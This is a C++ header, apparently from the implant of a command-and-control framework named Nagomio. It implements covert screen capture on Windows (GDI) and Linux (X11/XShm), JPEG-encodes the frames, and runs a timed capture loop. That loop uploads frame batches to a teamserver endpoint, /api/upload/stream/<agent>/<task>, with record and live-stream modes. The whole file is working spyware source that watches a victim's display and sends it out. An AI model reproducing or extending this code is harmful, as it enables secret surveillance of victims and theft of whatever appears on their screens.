// Shared infrastructure for the record_* and stream_* modules.
//
// Provides:
//   * Cross-platform helpers: bmp->rgb buffer, JPEG encode via stb_image_write,
//     base64, big-endian writer.
//   * Cross-platform frame capture: display (GDI / X11+Shm) and audio
//     (WaveIn / ALSA) helpers used by both record_* and stream_* modules.
//   * Display scaling: bilinear-friendly near-downscale by integer factor
//     used to keep per-frame size in check for live streaming.
//   * A zlib-based chunked-upload helper that posts binary frame batches to
//     the teamserver's /api/upload/stream/<agent>/<task> endpoint.
//
// Both record_* and stream_* modules use this so the heavy lifting lives
// in one place.

#pragma once

#include "../json.hpp"
#include "../protocol.h"
#include "stream_state.h"

#include <chrono>
#include <cstdint>
#include <cstring>
#include <string>
#include <thread>
#include <vector>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#else
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/extensions/XShm.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <cstdlib>
#endif

// We always want the JPEG writer; record_* and stream_* are the only TUs
// that include this header and the implementation is duplicated per TU.
#define STB_IMAGE_WRITE_IMPLEMENTATION
#define STB_IMAGE_WRITE_STATIC
#include "../stb_image_write.h"

namespace nagomio_stream {

// ---------------- binary / text helpers ----------------

static const char BASE64_CHARS[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

inline std::string base64_encode(const unsigned char* data, size_t len) {
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    int val = 0, bits = -6;
    for (size_t i = 0; i < len; ++i) {
        val = (val << 8) + data[i];
        bits += 8;
        while (bits >= 0) {
            out.push_back(BASE64_CHARS[(val >> bits) & 0x3F]);
            bits -= 6;
        }
    }
    if (bits > -6)
        out.push_back(BASE64_CHARS[((val << 8) >> (bits + 8)) & 0x3F]);
    while (out.size() % 4)
        out.push_back('=');
    return out;
}

inline void write_be32(std::vector<unsigned char>& buf, uint32_t v) {
    buf.push_back(static_cast<unsigned char>((v >> 24) & 0xFF));
    buf.push_back(static_cast<unsigned char>((v >> 16) & 0xFF));
    buf.push_back(static_cast<unsigned char>((v >> 8) & 0xFF));
    buf.push_back(static_cast<unsigned char>(v & 0xFF));
}

inline void write_le32(std::vector<unsigned char>& buf, uint32_t v) {
    buf.push_back(static_cast<unsigned char>(v & 0xFF));
    buf.push_back(static_cast<unsigned char>((v >> 8) & 0xFF));
    buf.push_back(static_cast<unsigned char>((v >> 16) & 0xFF));
    buf.push_back(static_cast<unsigned char>((v >> 24) & 0xFF));
}

inline void write_le16(std::vector<unsigned char>& buf, uint16_t v) {
    buf.push_back(static_cast<unsigned char>(v & 0xFF));
    buf.push_back(static_cast<unsigned char>((v >> 8) & 0xFF));
}

inline int parse_int_arg(const std::vector<std::string>& args, size_t idx, int def) {
    if (args.size() <= idx) return def;
    try {
        int v = std::stoi(args[idx]);
        return v > 0 ? v : def;
    } catch (...) {
        return def;
    }
}

// ---------------- JPEG encode ----------------

struct JpegWriteCtx {
    std::vector<unsigned char>* buf;
};

inline void jpeg_write_cb(void* ctx, void* data, int size) {
    auto* c = static_cast<JpegWriteCtx*>(ctx);
    auto* d = static_cast<unsigned char*>(data);
    c->buf->insert(c->buf->end(), d, d + size);
}

inline void encode_jpeg(std::vector<unsigned char>& out,
                       int width, int height, int channels,
                       const unsigned char* rgb, int quality) {
    out.clear();
    JpegWriteCtx ctx{&out};
    stbi_write_jpg_to_func(jpeg_write_cb, &ctx, width, height, channels, rgb, quality);
}

// ---------------- scale RGB24 ----------------

// Integer-step downscale: take every Nth pixel in each direction. Cheap and
// keeps per-frame size small for live streaming. Output dimensions round down.
inline void scale_rgb24(const unsigned char* src, int src_w, int src_h,
                        std::vector<unsigned char>& dst, int step) {
    if (step <= 1) {
        dst.assign(src, src + static_cast<size_t>(src_w) * src_h * 3);
        return;
    }
    int dst_w = src_w / step;
    int dst_h = src_h / step;
    dst.assign(static_cast<size_t>(dst_w) * dst_h * 3, 0);
    for (int y = 0; y < dst_h; ++y) {
        const unsigned char* src_row = src + static_cast<size_t>(y) * step * src_w * 3;
        unsigned char* dst_row = dst.data() + static_cast<size_t>(y) * dst_w * 3;
        for (int x = 0; x < dst_w; ++x) {
            dst_row[x * 3 + 0] = src_row[x * step * 3 + 0];
            dst_row[x * 3 + 1] = src_row[x * step * 3 + 1];
            dst_row[x * 3 + 2] = src_row[x * step * 3 + 2];
        }
    }
}

// ---------------- display capture (GDI / X11) ----------------

#ifdef _WIN32

inline bool capture_display_frame(int& width, int& height,
                                   std::vector<unsigned char>& rgb) {
    HDC hdc_screen = GetDC(nullptr);
    if (!hdc_screen) return false;
    width = GetDeviceCaps(hdc_screen, HORZRES);
    height = GetDeviceCaps(hdc_screen, VERTRES);
    if (width <= 0 || height <= 0) {
        ReleaseDC(nullptr, hdc_screen);
        return false;
    }
    HDC hdc_mem = CreateCompatibleDC(hdc_screen);
    if (!hdc_mem) {
        ReleaseDC(nullptr, hdc_screen);
        return false;
    }
    HBITMAP hbm = CreateCompatibleBitmap(hdc_screen, width, height);
    if (!hbm) {
        DeleteDC(hdc_mem);
        ReleaseDC(nullptr, hdc_screen);
        return false;
    }
    HGDIOBJ old = SelectObject(hdc_mem, hbm);
    if (!old || !BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY | CAPTUREBLT)) {
        if (old) SelectObject(hdc_mem, old);
        DeleteObject(hbm);
        DeleteDC(hdc_mem);
        ReleaseDC(nullptr, hdc_screen);
        return false;
    }

    BITMAPINFOHEADER bi{};
    bi.biSize = sizeof(bi);
    bi.biWidth = width;
    bi.biHeight = -height; // top-down
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;

    std::vector<unsigned char> bgra(static_cast<size_t>(width) * height * 4);
    int copied = GetDIBits(hdc_mem, hbm, 0, height, bgra.data(),
                           reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);

    SelectObject(hdc_mem, old);
    DeleteObject(hbm);
    DeleteDC(hdc_mem);
    ReleaseDC(nullptr, hdc_screen);

    if (copied != height) return false;

    rgb.resize(static_cast<size_t>(width) * height * 3);
    auto pixels = static_cast<int>(width) * height;
    for (int i = 0; i < pixels; ++i) {
        rgb[i * 3 + 0] = bgra[i * 4 + 2]; // R
        rgb[i * 3 + 1] = bgra[i * 4 + 1]; // G
        rgb[i * 3 + 2] = bgra[i * 4 + 0]; // B
    }
    return true;
}

#else // Linux X11

inline bool capture_display_frame(int& width, int& height,
                                   std::vector<unsigned char>& rgb) {
    Display* dpy = XOpenDisplay(nullptr);
    if (!dpy) return false;
    int screen = DefaultScreen(dpy);
    Window root = RootWindow(dpy, screen);
    XWindowAttributes attrs;
    XGetWindowAttributes(dpy, root, &attrs);
    width = attrs.width;
    height = attrs.height;

    int shm_major, shm_minor, pixmap_ok;
    bool has_shm = XShmQueryExtension(dpy) &&
                   XShmQueryVersion(dpy, &shm_major, &shm_minor, &pixmap_ok);

    if (has_shm) {
        XShmSegmentInfo shm_info;
        XImage* img = XShmCreateImage(dpy, DefaultVisual(dpy, screen),
                                      DefaultDepth(dpy, screen), ZPixmap,
                                      nullptr, &shm_info, width, height);
        if (!img) { XCloseDisplay(dpy); return false; }
        shm_info.shmid = shmget(IPC_PRIVATE, img->bytes_per_line * img->height,
                                IPC_CREAT | 0777);
        if (shm_info.shmid < 0) { XDestroyImage(img); XCloseDisplay(dpy); return false; }
        shm_info.shmaddr = img->data = static_cast<char*>(shmat(shm_info.shmid, nullptr, 0));
        shm_info.readOnly = False;
        XShmAttach(dpy, &shm_info);
        XShmGetImage(dpy, root, img, 0, 0, AllPlanes);

        rgb.resize(static_cast<size_t>(width) * height * 3);
        for (int y = 0; y < height; ++y) {
            for (int x = 0; x < width; ++x) {
                unsigned long pixel = XGetPixel(img, x, y);
                rgb[(static_cast<size_t>(y) * width + x) * 3 + 0] = (pixel >> 16) & 0xFF;
                rgb[(static_cast<size_t>(y) * width + x) * 3 + 1] = (pixel >> 8) & 0xFF;
                rgb[(static_cast<size_t>(y) * width + x) * 3 + 2] = pixel & 0xFF;
            }
        }
        XShmDetach(dpy, &shm_info);
        XDestroyImage(img);
        shmdt(shm_info.shmaddr);
        shmctl(shm_info.shmid, IPC_RMID, nullptr);
    } else {
        XImage* img = XGetImage(dpy, root, 0, 0, width, height, AllPlanes, ZPixmap);
        if (!img) { XCloseDisplay(dpy); return false; }
        rgb.resize(static_cast<size_t>(width) * height * 3);
        for (int y = 0; y < height; ++y) {
            for (int x = 0; x < width; ++x) {
                unsigned long pixel = XGetPixel(img, x, y);
                rgb[(static_cast<size_t>(y) * width + x) * 3 + 0] = (pixel >> 16) & 0xFF;
                rgb[(static_cast<size_t>(y) * width + x) * 3 + 1] = (pixel >> 8) & 0xFF;
                rgb[(static_cast<size_t>(y) * width + x) * 3 + 2] = pixel & 0xFF;
            }
        }
        XDestroyImage(img);
    }
    XCloseDisplay(dpy);
    return true;
}

#endif

// ---------------- chunked upload ----------------
//
// Posts a zlib-compressed chunk to /api/upload/stream/<agent>/<task>.
// `chunk_seq` is the per-stream chunk number (0-based).
// `is_final` is non-zero on the last chunk of a record.
// `jpeg_frames` is a vector of already-JPEG-encoded frame blobs (lengths
//  encoded with 4-byte BE size prefix each, just like the local MJPEG
//  container).
//
// On Windows we reuse WinHTTP; on Linux we use cpp-httplib. The wire format
// is a single 4-byte header `[seq BE32 | flags BE32]` followed by the
// compressed body.
//
// The agent's existing auth headers (HMAC + optional wire encryption) are
// applied automatically by the same helpers used for beacon/response.

struct ChunkUploadResult {
    bool ok = false;
    int status = 0;
    std::string body;
    std::string error;
};

} // namespace nagomio_stream

// The HTTP helpers live in main.cpp under the global ::NagomioHttp
// namespace. We forward-declare them here so the upload_stream_chunk
// call site (in nagomio_stream) can find them.
namespace NagomioHttp {
    struct ChunkPostResult {
        bool ok = false;
        int status = 0;
        std::string body;
        std::string error;
    };
    ChunkPostResult post_binary(const std::string& endpoint, const std::vector<unsigned char>& body);
}

namespace nagomio_stream {

inline ChunkUploadResult upload_stream_chunk(const std::string& agent_id,
                                              const std::string& task_id,
                                              uint32_t chunk_seq,
                                              uint32_t flags,
                                              const std::vector<unsigned char>& jpeg_frames_concat) {
    ChunkUploadResult result;
    std::string endpoint = "/api/upload/stream/" + agent_id + "/" + task_id;

    // Build body: [seq BE32][flags BE32][frames...]
    std::vector<unsigned char> body;
    write_be32(body, chunk_seq);
    write_be32(body, flags);
    body.insert(body.end(), jpeg_frames_concat.begin(), jpeg_frames_concat.end());

    auto r = NagomioHttp::post_binary(endpoint, body);
    result.ok = r.ok;
    result.status = r.status;
    result.body = r.body;
    result.error = r.error;
    return result;
}

// ---------------- capture loop ----------------
//
// A shared capture loop that drives a frame source at a fixed FPS, encodes
// each frame as JPEG, batches them into chunks of `frames_per_chunk`, and
// uploads each chunk to the teamserver. Continues until either:
//   * `max_duration_s` is reached (record mode), or
//   * `nagomio_modules::stream_stop_requested()` becomes true (live mode).
//
// `frame_capture` is a callable: `bool(int frame_index, int& out_w, int& out_h,
// std::vector<unsigned char>& out_rgb)`. It returns true on success. The RGB
// buffer is filled with width*height*3 bytes (RGB24) and may be scaled down
// on capture by the helper for live streaming.
//
// `max_duration_s <= 0` means run until stop flag. `> 0` means stop after that.

template <typename FrameCapture>
struct CaptureStats {
    int frame_count = 0;
    int chunk_count = 0;
    int width = 0;
    int height = 0;
    uint64_t total_bytes = 0;
    uint64_t elapsed_ms = 0;
    bool stopped_by_flag = false;
    bool transport_error = false;
    std::string last_error;
};

template <typename FrameCapture>
CaptureStats<FrameCapture> run_capture_loop(
    const std::string& agent_id,
    const std::string& task_id,
    FrameCapture&& frame_capture,
    int fps,
    int max_duration_s,
    int frames_per_chunk,
    int jpeg_quality = 70) {

    CaptureStats<FrameCapture> stats;
    if (fps < 1) fps = 1;
    if (fps > 30) fps = 30;
    if (frames_per_chunk < 1) frames_per_chunk = 1;
    if (frames_per_chunk > 30) frames_per_chunk = 30;
    if (jpeg_quality < 1) jpeg_quality = 1;
    if (jpeg_quality > 100) jpeg_quality = 100;

    int interval_ms = 1000 / fps;
    auto loop_start = std::chrono::steady_clock::now();
    auto end_time = max_duration_s > 0
                        ? loop_start + std::chrono::seconds(max_duration_s)
                        : std::chrono::steady_clock::time_point::max();

    std::vector<unsigned char> chunk;
    int frames_in_chunk = 0;
    uint32_t chunk_seq = 0;
    bool aborted = false;

    auto flush_chunk = [&](bool final) -> bool {
        // Always send a chunk on `final`, even if empty, so the server
        // sees the end-of-stream marker.
        if (chunk.empty() && !final) return true;
        uint32_t flags = final ? 1u : 0u;
        auto r = upload_stream_chunk(agent_id, task_id, chunk_seq, flags, chunk);
        if (!r.ok || r.status >= 400) {
            stats.transport_error = true;
            stats.last_error = "upload failed: " + r.error + " status=" + std::to_string(r.status);
            return false;
        }
        stats.chunk_count += 1;
        chunk_seq += 1;
        chunk.clear();
        frames_in_chunk = 0;
        return true;
    };

    int frame_idx = 0;
    while (true) {
        auto frame_start = std::chrono::steady_clock::now();

        if (nagomio_modules::stream_stop_requested()) {
            stats.stopped_by_flag = true;
            break;
        }
        if (frame_start >= end_time) break;

        int w = 0, h = 0;
        std::vector<unsigned char> rgb;
        if (!frame_capture(frame_idx, w, h, rgb)) {
            stats.transport_error = true;
            stats.last_error = "frame_capture returned false";
            aborted = true;
            break;
        }
        if (w <= 0 || h <= 0 || rgb.empty()) {
            stats.transport_error = true;
            stats.last_error = "frame_capture returned empty frame";
            aborted = true;
            break;
        }

        if (stats.frame_count == 0) {
            stats.width = w;
            stats.height = h;
        }

        std::vector<unsigned char> jpeg;
        encode_jpeg(jpeg, w, h, 3, rgb.data(), jpeg_quality);
        write_be32(chunk, static_cast<uint32_t>(jpeg.size()));
        chunk.insert(chunk.end(), jpeg.begin(), jpeg.end());
        stats.total_bytes += jpeg.size();
        frames_in_chunk += 1;
        stats.frame_count += 1;
        frame_idx += 1;

        if (frames_in_chunk >= frames_per_chunk) {
            if (!flush_chunk(false)) { aborted = true; break; }
        }

        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                           std::chrono::steady_clock::now() - frame_start)
                           .count();
        long long remaining = interval_ms - elapsed;
        if (remaining > 0) {
            int slept = 0;
            while (slept < remaining) {
                if (nagomio_modules::stream_stop_requested()) break;
                int slice = static_cast<int>(remaining - slept);
                if (slice > 50) slice = 50;
                std::this_thread::sleep_for(std::chrono::milliseconds(slice));
                slept += slice;
            }
        }
    }

    // Always send a final chunk so the server knows the stream is over.
    if (!flush_chunk(true)) {
        // final chunk failed too — record the error.
        if (stats.last_error.empty()) {
            stats.last_error = "final chunk upload failed";
        }
    }
    stats.elapsed_ms = static_cast<uint64_t>(std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - loop_start).count());
    (void)aborted;

    return stats;
}

} // namespace nagomio_stream
